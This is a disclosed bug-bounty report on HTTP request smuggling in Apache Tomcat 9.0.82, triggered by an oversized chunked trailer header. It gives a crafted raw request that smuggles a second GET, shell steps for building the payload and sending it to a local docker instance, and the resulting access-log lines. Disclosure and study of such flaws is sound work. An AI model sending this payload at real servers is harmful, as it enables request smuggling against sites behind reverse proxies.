# Possibility of Request smuggling attack

## Report Details
- **Report ID**: 2280391
- **URL**: https://hackerone.com/reports/2280391
- **State**: Closed
- **Severity**: high
- **Submitted**: 2023-12-11T03:45:40.874Z
- **Disclosed**: 2023-12-22T06:22:35.942Z

## Reporter
- **Username**: aimotonorihito
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
Request smuggling was possible by throwing an IOException with the upper size limit of the trailer header.
Confirmed with tomcat version 9.0.82.

* example
~~~~~~~~~~~~~~~~~~
POST /examples/test.jsp HTTP/1.1
Host: www.example.co.jp
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Connection: KeepAlive

5
foo=b
2
ar
0
testtrailer: aaaaa...(large size)
a: GET /examples/?this_is_attack HTTP/1.1
Host: attack

~~~~~~~~~~~~~~~~~~


* Reproduce with the following steps:
```
$ git clone https://github.com/oss-aimoto/tomcat-trailer.git
$ cd tomcat-trailer
$ docker-compose build
$ docker-compose up -d
$ echo -n "testtrailer: " > 8190_EXCLUDE_COLON_SP_CR_LF.txt
$ for i in `seq 8179`; do echo -n "a"; done >> 8190_EXCLUDE_COLON_SP_CR_LF.txt
$ perl -e 'print "\r\n"' >> 8190_EXCLUDE_COLON_SP_CR_LF.txt
$ head -11 base.txt > attack5.txt
$ cat 8190_EXCLUDE_COLON_SP_CR_LF.txt >> attack5.txt
$ perl -e 'print "a: GET /examples/?this_is_attack HTTP/1.1\r\nHost: attack\r\n\r\n"' >> attack5.txt
$ cat attack5.txt | curl telnet://localhost:8082/ --output -
```

The result of curl is two HTTP responses("/examples/test.jsp" and "/examples/?this_is_attack").
Two requests are recorded in the Tomcat access log.

```
192.168.128.1 - - [23/Oct/2023:06:55:37 +0000] "POST /examples/test.jsp HTTP/1.1" 200 58
192.168.128.1 - - [23/Oct/2023:06:55:37 +0000] "GET /examples/?this_is_attack HTTP/1.1" 200 1126 
```

## Impact

A trailer header that exceeded the header size limit could cause Tomcat to treat a single request as multiple requests leading to the possibility of request smuggling when behind a reverse proxy.

## Attachments
No attachments
